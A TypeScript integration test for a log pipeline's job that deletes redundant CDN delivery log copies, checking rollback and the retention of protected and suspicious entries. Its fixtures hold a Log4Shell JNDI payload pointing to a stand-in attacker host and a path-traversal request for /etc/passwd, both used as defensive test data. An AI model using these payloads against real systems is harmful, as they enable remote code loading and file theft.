import { expect, mock, test } from 'bun:test'
import { readFileSync } from 'node:fs'
import pg from 'pg'
import { fixture, encode } from './analyze-cdn-delivery.test.ts'

test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('CDN historical replay removes only delivery copies and preserves actionable originals, findings and rollback', async () => {
    const namespace = `cdn_delivery_replay_${process.pid}_${Date.now()}`
    const pool = new pg.Pool({ host: '127.0.0.1', port: Number(process.env.POSTGRES_FILTER_TEST_PORT), database: 'postgres_filter_test', options: `-c search_path=${namespace}` })
    let failDelete = false
    const query = (sql: string, values?: unknown[]) => pool.query(sql, values)
    const transaction = async (work: (tx: typeof query) => Promise<unknown>) => {
        const client = await pool.connect()
        try {
            await client.query('BEGIN')
            const result = await work((sql, values) => {
                if (failDelete && sql.startsWith('DELETE FROM service_logs')) throw new Error('Test source deletion failure')
                return client.query(sql, values)
            })
            await client.query('COMMIT'); return result
        }
        catch (error) { await client.query('ROLLBACK'); throw error } finally { client.release() }
    }
    mock.module('#db', () => ({ default: query, withTransaction: transaction }))
    try {
        expect((await query('SELECT current_database() name')).rows[0].name).toBe('postgres_filter_test')
        await query(`CREATE SCHEMA ${namespace}`)
        await query("CREATE TABLE organizations(id text PRIMARY KEY,name text,status text,created_at timestamptz DEFAULT NOW(),audit_safe_metadata jsonb DEFAULT '{}')")
        await query('CREATE TABLE users(id text PRIMARY KEY)')
        await query("INSERT INTO organizations(id,name,status) VALUES('platform','Hanasand','active')")
        const schema = readFileSync(new URL('../src/utils/db/ensureSchema.ts', import.meta.url), 'utf8')
        for (const table of ['service_logs', 'mill_events', 'mill_findings', 'mill_rules', 'system_events']) {
            const ddl = schema.match(new RegExp('CREATE TABLE IF NOT EXISTS ' + table + ' \\([\\s\\S]*?\\n        \\)'))?.[0]
            if (!ddl) throw new Error(`Missing schema ${table}`)
            await query(ddl)
        }
        await query('ALTER TABLE service_logs ADD COLUMN source_event_id text UNIQUE')
        await query('ALTER TABLE mill_events ADD COLUMN log_key text UNIQUE')
        const { default: install } = await import('../src/utils/db/logAnalyzeSchema.ts')
        const { default: jobs } = await import('../src/utils/db/ruleReprocessSchema.ts')
        const { recordLogBatch } = await import('../src/utils/logs/recordLog.ts')
        const { normalizeLogEvent } = await import('../src/utils/mill/logEvent.ts')
        const { processRuleReprocessJob } = await import('../src/utils/mill/ruleReprocess.ts')
        const { cdnDeliveryRuleId } = await import('../src/utils/mill/analyzeCdnDelivery.ts')
        await install(); await jobs()
        const good = fixture()
        const protectedCopy = { ...structuredClone(good), sourceEventId: 'c'.repeat(64) }
        const warning = { ...structuredClone(good), sourceEventId: 'd'.repeat(64), level: 'warn' }
        const unexpected = { ...structuredClone(good), sourceEventId: 'e'.repeat(64) }
        Object.assign(unexpected.metadata.structured.access, { user_agent: '${jndi:ldap://attacker.invalid/a}' })
        encode(unexpected)
        const original = { ...structuredClone(good), sourceEventId: 'f'.repeat(64), service: 'openresty',
            message: '203.0.113.7 - "GET /../../etc/passwd HTTP/1.1" 403 "scanner-agent" request_id=source-1' }
        await transaction(tx => recordLogBatch([good, protectedCopy, warning, unexpected, original] as any, tx as any))
        const raw = (await query('SELECT * FROM service_logs ORDER BY id')).rows
        expect(raw).toHaveLength(5)
        for (const row of raw) await query(`INSERT INTO mill_events(id,ingestion_id,organization_id,event_timestamp,normalized,log_key,processing_status)
            VALUES($1,'logs','platform',$2,$3::jsonb,$4,'processed')`, [`event-${row.id}`, row.created_at, JSON.stringify(normalizeLogEvent(row)), `service:${row.id}`])
        const enqueue = async (id: string) => query(`INSERT INTO mill_rule_reprocess_jobs(id,organization_id,rule_id,rule_version,requested_by,until_time,cursor)
            SELECT $1,organization_id,rule_id,version,'test',NOW(),$3::jsonb FROM mill_rules WHERE rule_id=$2`,
        [id, cdnDeliveryRuleId, JSON.stringify({ phase: 0, serviceEnd: String(raw.at(-1).id), trafficEnd: '0' })])
        await enqueue('disabled'); await processRuleReprocessJob()
        expect((await query("SELECT status FROM mill_rule_reprocess_jobs WHERE id='disabled'")).rows[0].status).toBe('cancelled')
        await query('UPDATE mill_rules SET enabled=true WHERE rule_id=$1', [cdnDeliveryRuleId])
        const protectedRow = raw.find(row => row.source_event_id === protectedCopy.sourceEventId)
        await query(`INSERT INTO mill_findings(id,organization_id,finding_key,rule_id,severity,summary,event_ids)
            VALUES('finding','platform','finding','custom','high','Retain evidence',$1::text[])`, [[`event-${protectedRow.id}`]])
        failDelete = true
        await enqueue('rollback'); await processRuleReprocessJob()
        expect((await query("SELECT status FROM mill_rule_reprocess_jobs WHERE id='rollback'")).rows[0].status).toBe('failed')
        for (const table of ['service_logs','mill_events']) expect((await query(`SELECT count(*) n FROM ${table}`)).rows[0].n).toBe('5')
        expect((await query('SELECT count(*) n FROM log_analyze_receipts')).rows[0].n).toBe('0')
        failDelete = false
        await enqueue('drop'); await processRuleReprocessJob()
        const job = (await query("SELECT * FROM mill_rule_reprocess_jobs WHERE id='drop'")).rows[0]
        expect(job.status).toBe('completed')
        expect(job.removed_sources).toBe('1'); expect(job.removed_events).toBe('1')
        for (const table of ['service_logs','mill_events']) expect((await query(`SELECT count(*) n FROM ${table}`)).rows[0].n).toBe('4')
        for (const kept of [protectedCopy, warning, unexpected, original]) {
            const row = (await query('SELECT * FROM service_logs WHERE source_event_id=$1', [kept.sourceEventId])).rows[0]
            expect(row.message).toBe(kept.message)
            expect((await query('SELECT count(*) n FROM mill_events WHERE log_key=$1', [`service:${row.id}`])).rows[0].n).toBe('1')
        }
        expect((await query('SELECT count(*) n FROM log_analyze_receipts')).rows[0].n).toBe('1')
    } finally { await query(`DROP SCHEMA IF EXISTS ${namespace} CASCADE`); await pool.end() }
})
